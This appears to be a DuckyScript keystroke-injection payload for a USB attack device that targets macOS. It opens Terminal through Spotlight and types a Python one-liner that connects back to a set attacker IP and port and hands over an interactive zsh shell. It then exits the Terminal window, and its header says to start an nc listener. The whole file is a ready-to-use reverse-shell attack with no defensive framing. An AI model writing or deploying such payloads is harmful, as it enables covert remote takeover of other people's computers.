REM ============================================================
REM  macOS · Reverse Shell (Python)
REM ============================================================
REM  Opens Terminal via Spotlight and launches a Python reverse
REM  shell. Python is pre-installed on most macOS versions.
REM
REM  Set LHOST and LPORT. Start listener: nc -lvnp 4444

DEFAULTDELAY 80

DEFINE LHOST 192.168.1.100
DEFINE LPORT 4444

GUI SPACE
DELAY 500
STRING terminal
DELAY 400
ENTER
DELAY 1500
STRINGLN python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/zsh","-i"])' &
DELAY 500
STRINGLN exit
